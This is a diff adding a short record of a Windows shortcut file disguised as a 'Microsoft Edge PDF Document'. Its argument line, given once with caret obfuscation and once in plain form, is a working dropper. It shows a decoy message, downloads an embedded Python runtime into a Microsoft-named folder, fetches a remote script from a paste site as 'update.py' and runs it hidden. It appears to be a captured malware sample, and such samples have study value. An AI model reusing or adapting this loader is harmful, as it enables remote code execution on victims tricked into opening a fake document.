@@ -1,0 +1,10 @@
+Name: Type: Microsoft Edge PDF Document
+Size: 1.83 KB
+Date modified: 09/23/2024 14:17:06
+Working Directory:
+Arguments: /c start msg %username% "????" & c^u^r^l -s -k https://www.python.org/ftp/python/3.12.5/python-3.12.5-embed-amd64.zip -o "%LOCALAPPDATA%\Microsoft\python.zip" & timeout 10 & mkdir "%LOCALAPPDATA%\Microsoft\Python" & tar -xf "%LOCALAPPDATA%\Microsoft\python.zip" -C "%LOCALAPPDATA%\Microsoft\Python" & c^u^r^l -s -k https://paste.ee/r/DQjd/o -o "%LOCALAPPDATA%\Microsoft\Python\update.py" & start "" /B "%LOCALAPPDATA%\Microsoft\Python\update.py"
+Icon Location: .\1.ms
+
+
+
+Arguments: /c start msg %username% "????" & curl -s -k https://www.python.org/ftp/python/3.12.5/python-3.12.5-embed-amd64.zip -o "%LOCALAPPDATA%\Microsoft\python.zip" & timeout 10 & mkdir "%LOCALAPPDATA%\Microsoft\Python" & tar -xf "%LOCALAPPDATA%\Microsoft\python.zip" -C "%LOCALAPPDATA%\Microsoft\Python" & curl -s -k https://paste.ee/r/DQjd/o -o "%LOCALAPPDATA%\Microsoft\Python\update.py" & start "" /B "%LOCALAPPDATA%\Microsoft\Python\update.py"
